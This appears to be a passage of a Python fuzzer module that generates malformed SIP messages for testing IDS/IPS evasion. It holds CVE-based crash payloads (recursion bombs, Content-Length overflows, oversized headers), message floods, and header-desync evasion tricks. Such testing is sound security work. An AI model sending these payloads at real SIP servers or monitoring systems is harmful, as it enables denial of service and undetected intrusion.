import random
import struct
import os
import string
from protocol.dynamic_data import get_commands, random_buffer_size, has_dynamic_data

# ---------------------------------------------------------------------------
# SIP mutation strategies for IDS/IPS evasion testing.
#
# Grounded in RFC 3261 (core SIP), RFC 4566 (SDP), RFC 5411 (SIP RFC
# ecosystem) + real-world CVEs:
#   CVE-2023-32887 (MediaTek VoLTE — comment recursion stack overflow)
#   OpenSIPS GHSA-c6j5-f4h4-2xrq (Content-Length integer overflow)
#   sngrep PR#480 (stack buffer overflow in Call-ID/Warning headers)
#   Asterisk PJSIP INVITE flood DoS (TCP connection exhaustion)
#   Kamailio off-by-one heap overflow (exploit-db 44316)
#   PROTOS c07-SIP test suite
#
# Target surface: Snort 3 SIP inspector (gid 140 — parses methods, headers,
# Content-Length, SDP body). Also gid-1 text rules on SIP ports.
#
# SIP is text-based, HTTP-like.  Transport: UDP 5060 (default), TCP 5060,
# TLS/SIPS 5061.  The fuzzer mirrors the UDP datagram pattern (like DHCP/
# SNMP): each payload is one complete SIP message in a single UDP datagram.
#
# Each strategy's build function returns (payload_bytes, dst_port).
# The SipMutator.mutate() method returns (payload_bytes, strategy_name,
# dst_port) — identical contract to Dhcpv6Mutator / SnmpMutator.
# ---------------------------------------------------------------------------

SIP_STRATEGIES = [
    "comment_recursion_bomb",
    "content_length_overflow",
    "oversized_header_overflow",
    "invite_flood_dos",
    "compact_form_desync",
    "hcolon_whitespace_evasion",
    "line_folding_obfuscation",
    "content_length_smuggling",
    "uri_escape_injection",
    "multipart_mime_wrap",
    "malformed_startline",
    "mandatory_header_omission",
    "sdp_body_malformation",
    "digest_auth_state_desync",
]

# Base weights — higher = more selection mass.  Strategies grounded in real
# CVEs and deep parser surfaces get the most weight; evasion-only / DoS
# strategies get less.
SIP_WEIGHTS = [14, 14, 12, 6, 10, 8, 8, 10, 8, 6, 6, 5, 10, 5]

SIP_STRATEGY_LABELS = {
    "comment_recursion_bomb":      "Comment Recursion Bomb",
    "content_length_overflow":     "Content-Length Overflow",
    "oversized_header_overflow":   "Oversized Header Overflow",
    "invite_flood_dos":            "INVITE Flood DoS",
    "compact_form_desync":         "Compact-Form Desync",
    "hcolon_whitespace_evasion":   "HCOLON Whitespace Evasion",
    "line_folding_obfuscation":    "Line-Folding Obfuscation",
    "content_length_smuggling":    "Content-Length Smuggling",
    "uri_escape_injection":        "URI Escape Injection",
    "multipart_mime_wrap":         "Multipart/MIME Wrap",
    "malformed_startline":         "Malformed Start-Line",
    "mandatory_header_omission":   "Mandatory Header Omission/Dup",
    "sdp_body_malformation":       "SDP Body Malformation",
    "digest_auth_state_desync":    "Digest Auth / State Desync",
}

# ── Constants ─────────────────────────────────────────────────────────────

_SIP_PORT = 5060
_SIP_VERSION = b"SIP/2.0"
_CRLF = b"\r\n"
_MAX_SEG = 58000

_METHODS = [b"INVITE", b"REGISTER", b"OPTIONS", b"BYE", b"CANCEL", b"ACK",
            b"SUBSCRIBE", b"NOTIFY", b"PUBLISH", b"MESSAGE", b"REFER",
            b"UPDATE", b"PRACK", b"INFO"]

_COMPACT_MAP = {
    b"Via": b"v", b"From": b"f", b"To": b"t", b"Call-ID": b"i",
    b"Contact": b"m", b"Content-Type": b"c", b"Content-Length": b"l",
    b"Subject": b"s", b"Supported": b"k", b"Content-Encoding": b"e",
}

_STATUS_CODES = [
    (100, b"Trying"), (180, b"Ringing"), (183, b"Session Progress"),
    (200, b"OK"), (301, b"Moved Permanently"), (302, b"Moved Temporarily"),
    (400, b"Bad Request"), (401, b"Unauthorized"), (403, b"Forbidden"),
    (404, b"Not Found"), (407, b"Proxy Authentication Required"),
    (408, b"Request Timeout"), (480, b"Temporarily Unavailable"),
    (481, b"Call/Transaction Does Not Exist"), (486, b"Busy Here"),
    (487, b"Request Terminated"), (500, b"Server Internal Error"),
    (503, b"Service Unavailable"), (600, b"Busy Everywhere"),
]


# ── Helpers ───────────────────────────────────────────────────────────────

def _rand_ip():
    return f"{random.randint(10,192)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def _rand_tag():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 16)))


def _rand_branch():
    return "z9hG4bK" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(12, 24)))


def _rand_callid():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(16, 32))) + "@" + _rand_ip()


def _rand_user():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(4, 12)))


def _rand_domain():
    tlds = ["com", "net", "org", "io", "local", "invalid"]
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10))) + "." + random.choice(tlds)


def _rand_uri():
    return f"sip:{_rand_user()}@{_rand_domain()}"


def _basic_headers(method=b"INVITE", uri=None, extra_headers=None, body=b""):
    """Build a structurally valid SIP request with mandatory headers."""
    if uri is None:
        uri = _rand_uri().encode()
    ip = _rand_ip()
    from_tag = _rand_tag()
    to_tag = _rand_tag()
    branch = _rand_branch()
    callid = _rand_callid()
    cseq = random.randint(1, 999999)

    hdrs = [
        method + b" " + uri + b" SIP/2.0",
        b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + branch.encode(),
        b"From: <sip:" + _rand_user().encode() + b"@" + ip.encode() + b">;tag=" + from_tag.encode(),
        b"To: <" + uri + b">;tag=" + to_tag.encode(),
        b"Call-ID: " + callid.encode(),
        b"CSeq: " + str(cseq).encode() + b" " + method,
        b"Max-Forwards: 70",
        b"Content-Length: " + str(len(body)).encode(),
    ]
    if body:
        hdrs.append(b"Content-Type: application/sdp")
    if extra_headers:
        hdrs.extend(extra_headers)
    return _CRLF.join(hdrs) + _CRLF + _CRLF + body


def _minimal_sdp(ip=None):
    """Return a minimal but valid SDP body for INVITE."""
    ip = ip or _rand_ip()
    port = random.randint(10000, 60000)
    sess_id = random.randint(100000, 999999)
    lines = [
        b"v=0",
        f"o=- {sess_id} {sess_id} IN IP4 {ip}".encode(),
        b"s=-",
        f"c=IN IP4 {ip}".encode(),
        b"t=0 0",
        f"m=audio {port} RTP/AVP 0 8 101".encode(),
        b"a=rtpmap:0 PCMU/8000",
        b"a=rtpmap:8 PCMA/8000",
        b"a=rtpmap:101 telephone-event/8000",
    ]
    return _CRLF.join(lines) + _CRLF


# ── Strategy 1: Comment Recursion Bomb ────────────────────────────────────
# CVE-2023-32887 (MediaTek): unbounded recursion in SIP MIME comment parser.
# RFC 3261 comment = LPAREN *(ctext / quoted-pair / comment) RPAREN — nested
# comments are legal, and each '(' recurse pushes ~0x30 bytes on the stack.
# Pathological: 500-2000 nested open parens as the Via value prefix.

def _build_comment_recursion_bomb():
    v = random.choice(["via_deep", "from_deep", "contact_deep", "multi_header",
                        "mixed_depth", "reason_phrase", "display_name", "incremental"])
    ip = _rand_ip()
    branch = _rand_branch()

    if v == "via_deep":
        depth = random.randint(500, 2000)
        comment = b"(" * depth + b" " + b"SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + branch.encode()
        via = b"Via: " + comment
        return _basic_headers(extra_headers=[via]), _SIP_PORT
    elif v == "from_deep":
        depth = random.randint(500, 1500)
        comment = b"(" * depth + b" " + _rand_user().encode() + b" " + b")" * depth
        hdr = b'From: "' + comment + b'" <sip:' + _rand_user().encode() + b"@" + ip.encode() + b">;tag=" + _rand_tag().encode()
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "contact_deep":
        depth = random.randint(600, 1800)
        comment = b"(" * depth + b"contact" + b")" * depth
        hdr = b"Contact: " + comment + b" <sip:" + _rand_user().encode() + b"@" + ip.encode() + b">"
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "multi_header":
        depth = random.randint(300, 800)
        comment = b"(" * depth + b"x" + b")" * depth
        hdrs = [
            b"Via: " + comment + b" SIP/2.0/UDP " + ip.encode() + b";branch=" + branch.encode(),
            b"From: " + comment + b" <sip:a@b.c>;tag=x",
            b"Contact: " + comment + b" <sip:a@b.c>",
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT
    elif v == "mixed_depth":
        # Alternating open/close with deep nesting to confuse depth tracking
        parts = []
        for _ in range(random.randint(50, 200)):
            d = random.randint(1, 10)
            parts.append(b"(" * d + os.urandom(random.randint(1, 5)) + b")" * d)
        comment = b"".join(parts)
        hdr = b"Via: " + comment + b" SIP/2.0/UDP " + ip.encode() + b";branch=" + branch.encode()
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "reason_phrase":
        # Status line with nested comments in the Reason-Phrase
        depth = random.randint(500, 1500)
        reason = b"(" * depth + b"OK" + b")" * depth
        status = b"SIP/2.0 200 " + reason
        resp_hdrs = [
            status,
            b"Via: SIP/2.0/UDP " + ip.encode() + b";branch=" + branch.encode(),
            b"From: <sip:a@b.c>;tag=x",
            b"To: <sip:a@b.c>;tag=y",
            b"Call-ID: " + _rand_callid().encode(),
            b"CSeq: 1 INVITE",
            b"Content-Length: 0",
        ]
        return _CRLF.join(resp_hdrs) + _CRLF + _CRLF, _SIP_PORT
    elif v == "display_name":
        depth = random.randint(400, 1200)
        # Comments inside display-name quoted string — still parsed by some stacks
        dn = b"(" * depth + b"user" + b")" * depth
        hdr = b'To: "' + dn + b'" <sip:' + _rand_user().encode() + b"@" + _rand_domain().encode() + b">"
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    else:  # incremental
        # Send multiple messages with increasing depth to find the exact crash threshold
        pkts = b""
        for depth in [100, 250, 500, 750, 1000, 1500, 2000]:
            comment = b"(" * depth + b"x"
            hdr = b"Via: " + comment + b" SIP/2.0/UDP " + ip.encode() + b";branch=" + _rand_branch().encode()
            pkts += _basic_headers(extra_headers=[hdr])
        return pkts[:_MAX_SEG], _SIP_PORT


# ── Strategy 2: Content-Length Overflow ───────────────────────────────────
# OpenSIPS GHSA-c6j5-f4h4-2xrq: integer overflow in CL parser when
# number = number*10 + digit wraps negative.  Also test CL = huge, negative,
# non-numeric, 2^31, 2^32, 2^63, 0xFFFFFFFF, etc.

def _build_content_length_overflow():
    v = random.choice(["huge", "negative", "non_numeric", "int32_boundary",
                        "int64_boundary", "leading_zeros", "whitespace",
                        "multiple_cl"])
    ip = _rand_ip()
    uri = _rand_uri().encode()
    method = random.choice([b"INVITE", b"REGISTER", b"OPTIONS", b"MESSAGE"])
    sdp = _minimal_sdp(ip)

    def _msg(cl_value, body=sdp):
        hdrs = [
            method + b" " + uri + b" SIP/2.0",
            b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode(),
            b"From: <sip:" + _rand_user().encode() + b"@" + ip.encode() + b">;tag=" + _rand_tag().encode(),
            b"To: <" + uri + b">",
            b"Call-ID: " + _rand_callid().encode(),
            b"CSeq: 1 " + method,
            b"Max-Forwards: 70",
            b"Content-Length: " + cl_value,
        ]
        if body:
            hdrs.append(b"Content-Type: application/sdp")
        return _CRLF.join(hdrs) + _CRLF + _CRLF + body

    if v == "huge":
        cl = str(random.choice([99999999999999999999, 2**63, 2**64 - 1])).encode()
        return _msg(cl), _SIP_PORT
    elif v == "negative":
        cl = str(random.choice([-1, -2147483648, -9999999999])).encode()
        return _msg(cl), _SIP_PORT
    elif v == "non_numeric":
        cl = random.choice([b"AAAA", b"0x1000", b"1e10", b"12 34", b"", b"\x00\x00"])
        return _msg(cl), _SIP_PORT
    elif v == "int32_boundary":
        # Values around 2^31 boundary — the exact overflow point for signed 32-bit
        cl = str(random.choice([2147483647, 2147483648, 2147483649, 4294967295])).encode()
        return _msg(cl), _SIP_PORT
    elif v == "int64_boundary":
        cl = str(random.choice([9223372036854775807, 9223372036854775808, 18446744073709551615])).encode()
        return _msg(cl), _SIP_PORT
    elif v == "leading_zeros":
        # Non-canonical: "0000000100" — some parsers miscount
        cl = b"0" * random.randint(50, 200) + str(len(sdp)).encode()
        return _msg(cl), _SIP_PORT
    elif v == "whitespace":
        # Whitespace around/within the CL value
        cl = random.choice([
            b" " + str(len(sdp)).encode(),
            str(len(sdp)).encode() + b" ",
            b"\t" + str(len(sdp)).encode() + b"\t",
            str(len(sdp)).encode() + b" ; q=1",
        ])
        return _msg(cl), _SIP_PORT
    else:  # multiple_cl
        # Duplicate Content-Length with conflicting values
        hdrs = [
            method + b" " + uri + b" SIP/2.0",
            b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode(),
            b"From: <sip:" + _rand_user().encode() + b"@" + ip.encode() + b">;tag=" + _rand_tag().encode(),
            b"To: <" + uri + b">",
            b"Call-ID: " + _rand_callid().encode(),
            b"CSeq: 1 " + method,
            b"Max-Forwards: 70",
            b"Content-Length: " + str(len(sdp)).encode(),
            b"Content-Length: 0",
            b"Content-Length: 999999",
            b"Content-Type: application/sdp",
        ]
        return _CRLF.join(hdrs) + _CRLF + _CRLF + sdp, _SIP_PORT


# ── Strategy 3: Oversized Header Overflow ─────────────────────────────────
# sngrep PR#480: stack buffer overflow in Call-ID, Warning, X-Call-ID,
# Contact when values exceed fixed buffers.

def _build_oversized_header_overflow():
    v = random.choice(["call_id", "via_branch", "contact", "warning",
                        "display_name", "tag_param", "multi_oversized",
                        "reason_header"])
    ip = _rand_ip()

    if v == "call_id":
        # Oversized Call-ID: 40KB+
        giant_callid = os.urandom(random.randint(20000, 45000)).hex()
        hdr = b"Call-ID: " + giant_callid.encode()
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "via_branch":
        # Oversized branch parameter
        branch = "z9hG4bK" + "A" * random.randint(20000, 50000)
        hdr = b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + branch.encode()
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "contact":
        # Oversized Contact URI with huge userinfo
        user = "A" * random.randint(20000, 50000)
        hdr = b"Contact: <sip:" + user.encode() + b"@" + ip.encode() + b">"
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "warning":
        # Warning header: warn-code SP warn-agent SP warn-text
        warn_text = "A" * random.randint(30000, 55000)
        hdr = b'Warning: 399 ' + ip.encode() + b' "' + warn_text.encode() + b'"'
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "display_name":
        # Oversized display-name in From/To
        dn = "A" * random.randint(20000, 50000)
        hdr = b'From: "' + dn.encode() + b'" <sip:a@b.c>;tag=' + _rand_tag().encode()
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "tag_param":
        # Oversized tag parameter
        tag = "A" * random.randint(20000, 50000)
        hdr = b"From: <sip:a@b.c>;tag=" + tag.encode()
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "multi_oversized":
        # Multiple oversized headers at once — compound pressure
        size = random.randint(8000, 15000)
        hdrs = [
            b"Call-ID: " + (b"B" * size),
            b"X-Call-ID: " + (b"C" * size),
            b'Warning: 399 agent "' + (b"D" * size) + b'"',
            b"Subject: " + (b"E" * size),
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT
    else:  # reason_header
        # Reason header with huge protocol-specific text
        text = "A" * random.randint(20000, 45000)
        hdr = b"Reason: SIP;cause=200;text=\"" + text.encode() + b"\""
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT


# ── Strategy 4: INVITE Flood DoS ─────────────────────────────────────────
# Asterisk PJSIP: rapid INVITE flood over TCP/UDP crashes the UA.
# Each INVITE has a unique branch + Call-ID to create distinct transactions.

def _build_invite_flood_dos():
    v = random.choice(["unique_dialog", "same_dialog", "register_flood",
                        "options_flood", "mixed_method", "cancel_race",
                        "ack_storm", "bye_storm"])
    ip = _rand_ip()
    target_uri = _rand_uri().encode()

    if v == "unique_dialog":
        pkts = b""
        for _ in range(random.randint(30, 80)):
            sdp = _minimal_sdp(ip)
            pkt = _basic_headers(method=b"INVITE", uri=target_uri, body=sdp)
            pkts += pkt
        return pkts[:_MAX_SEG], _SIP_PORT
    elif v == "same_dialog":
        # All INVITEs share the same Call-ID (re-INVITE storm)
        callid = _rand_callid().encode()
        from_tag = _rand_tag().encode()
        pkts = b""
        for seq in range(1, random.randint(30, 80)):
            sdp = _minimal_sdp(ip)
            hdrs = [
                b"INVITE " + target_uri + b" SIP/2.0",
                b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode(),
                b"From: <sip:flood@" + ip.encode() + b">;tag=" + from_tag,
                b"To: <" + target_uri + b">",
                b"Call-ID: " + callid,
                b"CSeq: " + str(seq).encode() + b" INVITE",
                b"Max-Forwards: 70",
                b"Content-Type: application/sdp",
                b"Content-Length: " + str(len(sdp)).encode(),
            ]
            pkts += _CRLF.join(hdrs) + _CRLF + _CRLF + sdp
        return pkts[:_MAX_SEG], _SIP_PORT
    elif v == "register_flood":
        pkts = b""
        for _ in range(random.randint(50, 100)):
            pkt = _basic_headers(method=b"REGISTER",
                                  uri=b"sip:" + _rand_domain().encode(),
                                  extra_headers=[b"Contact: <sip:" + _rand_user().encode() + b"@" + ip.encode() + b">;expires=3600"])
            pkts += pkt
        return pkts[:_MAX_SEG], _SIP_PORT
    elif v == "options_flood":
        pkts = b""
        for _ in range(random.randint(50, 120)):
            pkts += _basic_headers(method=b"OPTIONS", uri=target_uri)
        return pkts[:_MAX_SEG], _SIP_PORT
    elif v == "mixed_method":
        pkts = b""
        for _ in range(random.randint(30, 60)):
            m = random.choice(_METHODS)
            body = _minimal_sdp(ip) if m == b"INVITE" else b""
            pkts += _basic_headers(method=m, uri=target_uri, body=body)
        return pkts[:_MAX_SEG], _SIP_PORT
    elif v == "cancel_race":
        # INVITE immediately followed by CANCEL (race condition)
        pkts = b""
        for _ in range(random.randint(20, 50)):
            branch = _rand_branch().encode()
            callid = _rand_callid().encode()
            cseq = str(random.randint(1, 99999)).encode()
            common = [
                b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + branch,
                b"From: <sip:a@" + ip.encode() + b">;tag=" + _rand_tag().encode(),
                b"To: <" + target_uri + b">",
                b"Call-ID: " + callid,
                b"Max-Forwards: 70",
                b"Content-Length: 0",
            ]
            inv = _CRLF.join([b"INVITE " + target_uri + b" SIP/2.0"] + common +
                              [b"CSeq: " + cseq + b" INVITE"]) + _CRLF + _CRLF
            can = _CRLF.join([b"CANCEL " + target_uri + b" SIP/2.0"] + common +
                              [b"CSeq: " + cseq + b" CANCEL"]) + _CRLF + _CRLF
            pkts += inv + can
        return pkts[:_MAX_SEG], _SIP_PORT
    elif v == "ack_storm":
        # ACK flood for non-existent dialogs
        pkts = b""
        for _ in range(random.randint(50, 120)):
            pkts += _basic_headers(method=b"ACK", uri=target_uri)
        return pkts[:_MAX_SEG], _SIP_PORT
    else:  # bye_storm
        # Out-of-dialog BYE flood
        pkts = b""
        for _ in range(random.randint(50, 120)):
            pkts += _basic_headers(method=b"BYE", uri=target_uri)
        return pkts[:_MAX_SEG], _SIP_PORT


# ── Strategy 5: Compact-Form Desync ──────────────────────────────────────
# IDS evasion: send the same header in both long and compact form in the
# same message (Via + v, From + f, etc.).  IDS may key on one form, the UA
# reads the other — semantic gap.

def _build_compact_form_desync():
    v = random.choice(["all_compact", "mixed_same_header", "long_short_conflict",
                        "via_v_desync", "from_f_desync", "cl_l_desync",
                        "contact_m_desync", "all_long_dup_compact"])
    ip = _rand_ip()
    uri = _rand_uri().encode()
    branch = _rand_branch().encode()
    tag = _rand_tag().encode()
    callid = _rand_callid().encode()

    if v == "all_compact":
        # Entire message uses only compact forms
        hdrs = [
            b"INVITE " + uri + b" SIP/2.0",
            b"v: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + branch,
            b"f: <sip:a@b.c>;tag=" + tag,
            b"t: <" + uri + b">",
            b"i: " + callid,
            b"CSeq: 1 INVITE",
            b"Max-Forwards: 70",
            b"m: <sip:" + _rand_user().encode() + b"@" + ip.encode() + b">",
            b"l: 0",
        ]
        return _CRLF.join(hdrs) + _CRLF + _CRLF, _SIP_PORT
    elif v == "mixed_same_header":
        # Same header appears in both long and compact form
        hdrs = [
            b"INVITE " + uri + b" SIP/2.0",
            b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + branch,
            b"v: SIP/2.0/UDP 10.0.0.1:5060;branch=" + _rand_branch().encode(),
            b"From: <sip:good@safe.com>;tag=" + tag,
            b"f: <sip:evil@attack.com>;tag=" + _rand_tag().encode(),
            b"To: <" + uri + b">",
            b"Call-ID: " + callid,
            b"CSeq: 1 INVITE",
            b"Max-Forwards: 70",
            b"Content-Length: 0",
        ]
        return _CRLF.join(hdrs) + _CRLF + _CRLF, _SIP_PORT
    elif v == "long_short_conflict":
        # Content-Length in long form says 0, compact form says huge
        sdp = _minimal_sdp(ip)
        hdrs = [
            b"INVITE " + uri + b" SIP/2.0",
            b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + branch,
            b"From: <sip:a@b.c>;tag=" + tag,
            b"To: <" + uri + b">",
            b"Call-ID: " + callid,
            b"CSeq: 1 INVITE",
            b"Max-Forwards: 70",
            b"Content-Length: 0",
            b"l: " + str(len(sdp)).encode(),
            b"Content-Type: application/sdp",
        ]
        return _CRLF.join(hdrs) + _CRLF + _CRLF + sdp, _SIP_PORT
    elif v == "via_v_desync":
        # Two Via headers: long form with safe IP, compact with attacker IP
        safe_branch = _rand_branch().encode()
        hdrs = [
            b"Via: SIP/2.0/UDP 10.0.0.1:5060;branch=" + safe_branch,
            b"v: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + branch + b";received=" + ip.encode(),
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT
    elif v == "from_f_desync":
        hdrs = [
            b"From: <sip:legitimate@corp.com>;tag=" + tag,
            b"f: <sip:attacker@evil.com>;tag=" + _rand_tag().encode(),
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT
    elif v == "cl_l_desync":
        sdp = _minimal_sdp(ip)
        real_len = str(len(sdp)).encode()
        hdrs = [
            b"Content-Length: " + str(len(sdp) + 500).encode(),
            b"l: " + real_len,
        ]
        return _basic_headers(body=sdp, extra_headers=hdrs), _SIP_PORT
    elif v == "contact_m_desync":
        hdrs = [
            b"Contact: <sip:safe@10.0.0.1>",
            b"m: <sip:evil@" + ip.encode() + b">",
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT
    else:  # all_long_dup_compact
        # Every mandatory header duplicated in compact form with different values
        hdrs = [
            b"Via: SIP/2.0/UDP 10.0.0.1:5060;branch=" + _rand_branch().encode(),
            b"v: SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + branch,
            b"From: <sip:a@safe.com>;tag=aaa",
            b"f: <sip:x@evil.com>;tag=bbb",
            b"To: <sip:b@safe.com>",
            b"t: <sip:y@evil.com>",
            b"Call-ID: safe-call@10.0.0.1",
            b"i: evil-call@" + ip.encode(),
            b"Content-Length: 0",
            b"l: 99999",
            b"Contact: <sip:safe@10.0.0.1>",
            b"m: <sip:evil@" + ip.encode() + b">",
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT


# ── Strategy 6: HCOLON Whitespace Evasion ─────────────────────────────────
# RFC 3261 HCOLON = *(SP/HTAB) ":" SWS.  So "Via : ..." and "Via\t:..." are
# legal.  Many IDS signature engines only match "Via:" with no whitespace.

def _build_hcolon_whitespace_evasion():
    v = random.choice(["space_before_colon", "tab_before_colon", "multi_ws",
                        "sws_after_colon", "mixed_all_headers", "null_ws",
                        "vertical_ws", "extreme_padding"])
    ip = _rand_ip()
    uri = _rand_uri().encode()

    def _h(name, sep, value):
        return name + sep + value

    if v == "space_before_colon":
        hdrs = [
            _h(b"Via", b" : ", b"SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode()),
            _h(b"From", b" : ", b"<sip:a@b.c>;tag=" + _rand_tag().encode()),
            _h(b"To", b" : ", b"<" + uri + b">"),
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT
    elif v == "tab_before_colon":
        hdrs = [
            _h(b"Via", b"\t: ", b"SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode()),
            _h(b"From", b"\t: ", b"<sip:a@b.c>;tag=" + _rand_tag().encode()),
            _h(b"Call-ID", b"\t: ", _rand_callid().encode()),
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT
    elif v == "multi_ws":
        ws = b" " * random.randint(5, 50)
        hdrs = [
            _h(b"Via", ws + b":" + ws, b"SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode()),
            _h(b"From", ws + b":" + ws, b"<sip:a@b.c>;tag=" + _rand_tag().encode()),
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT
    elif v == "sws_after_colon":
        hdrs = [
            _h(b"Via", b":", b"\t  \t SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode()),
            _h(b"From", b":", b"   <sip:a@b.c>;tag=" + _rand_tag().encode()),
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT
    elif v == "mixed_all_headers":
        seps = [b" : ", b"\t: ", b" \t: ", b"  :  ", b"\t:\t", b": "]
        hdrs = [
            _h(b"Via", random.choice(seps), b"SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode()),
            _h(b"From", random.choice(seps), b"<sip:a@b.c>;tag=" + _rand_tag().encode()),
            _h(b"To", random.choice(seps), b"<" + uri + b">"),
            _h(b"Call-ID", random.choice(seps), _rand_callid().encode()),
            _h(b"CSeq", random.choice(seps), b"1 INVITE"),
            _h(b"Max-Forwards", random.choice(seps), b"70"),
            _h(b"Content-Length", random.choice(seps), b"0"),
        ]
        return _CRLF.join([b"INVITE " + uri + b" SIP/2.0"] + hdrs) + _CRLF + _CRLF, _SIP_PORT
    elif v == "null_ws":
        # \x0b (VT) and \x0c (FF) — some parsers treat as whitespace
        hdrs = [
            _h(b"Via", b"\x0b:\x0c", b"SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode()),
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT
    elif v == "vertical_ws":
        hdrs = [
            _h(b"Via", b"\x0b\x0c : \x0b", b"SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode()),
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT
    else:  # extreme_padding
        ws = (b" \t" * random.randint(500, 2000))
        hdrs = [
            _h(b"Via", ws + b":" + ws, b"SIP/2.0/UDP " + ip.encode() + b":5060;branch=" + _rand_branch().encode()),
        ]
        return _basic_headers(extra_headers=hdrs), _SIP_PORT


# ── Strategy 7: Line-Folding Obfuscation ─────────────────────────────────
# Header continuation: line starting with SP/HTAB is folded into the
# previous header value.  Breaks contiguous-string signature matching.

def _build_line_folding_obfuscation():
    v = random.choice(["via_fold", "from_fold", "callid_fold", "branch_fold",
                        "multi_fold", "deep_fold", "body_desync", "all_headers"])
    ip = _rand_ip()
    uri = _rand_uri().encode()

    if v == "via_fold":
        # Split Via value across continuation line
        branch = _rand_branch().encode()
        hdr = b"Via: SIP/2.0/UDP\r\n " + ip.encode() + b":5060;branch=\r\n\t" + branch
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "from_fold":
        hdr = b"From:\r\n <sip:" + _rand_user().encode() + b"@" + ip.encode() + b">\r\n ;tag=" + _rand_tag().encode()
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "callid_fold":
        callid = _rand_callid().encode()
        mid = len(callid) // 2
        hdr = b"Call-ID:\r\n " + callid[:mid] + b"\r\n " + callid[mid:]
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "branch_fold":
        # Fold mid-branch to break z9hG4bK matching
        branch = _rand_branch().encode()
        hdr = b"Via: SIP/2.0/UDP " + ip.encode() + b":5060;branch=z9hG4bK\r\n " + branch[7:]
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "multi_fold":
        # Multiple continuation lines per header
        parts = [b"SIP/2.0/UDP", ip.encode() + b":5060",
                 b";branch=" + _rand_branch().encode(),
                 b";received=" + _rand_ip().encode(),
                 b";rport=5060"]
        folded = _CRLF.join(b" " + p for p in parts)
        hdr = b"Via:" + folded
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "deep_fold":
        # 20+ continuation lines for one header
        parts = [os.urandom(random.randint(3, 10)).hex().encode() for _ in range(random.randint(20, 50))]
        folded = _CRLF.join(b" " + p for p in parts)
        hdr = b"X-Debug:" + folded
        return _basic_headers(extra_headers=[hdr]), _SIP_PORT
    elif v == "body_desync":
        # Fold Content-Length value to confuse body boundary
        sdp = _minimal_sdp(ip)
        cl = str(len(sdp)).encode()
        hdr = b"Content-Length:\r\n " + cl
        return _basic_headers(body=sdp, extra_headers=[hdr]), _SIP_PORT
    else:  # all_headers
        # Every header uses folding
        hdrs = [
            b"Via:\r\n SIP/2.0/UDP\r\n " + ip.encode() + b":5060\r\n ;branch=" + _rand_branch().encode(),
            b"From:\r\n <sip:a@b.c>\r\n ;tag=" + _rand_tag().encode(),
            b"To:\r\n <" + uri + b">",
            b"Call-ID:\r\n " + _rand_callid().encode(),
            b"CSeq:\r\n 1\r\n INVITE",
            b"Max-Forwards:\r\n 70",
            b"Content-Length:\r\n 0",
        ]
        return _CRLF.join([b"INVITE " + uri + b" SIP/2.0"] + hdrs) + _CRLF + _CRLF, _SIP_PORT


# ── Strategy 8: Content-Length Smuggling ──────────────────────────────────
# CL != body length to make IDS see different content than UA.

def _build_content_length_smuggling(payload_override=None):
    if payload_override is not None:
        ip = _rand_ip()
        uri = _rand_uri().encode()
        body = b"AAAA" + payload_override
        return _basic_headers(body=body, extra_headers=[
            b"Content-Length: 4",
            b"Content-Type: application/sdp",
        ]), _SIP_PORT
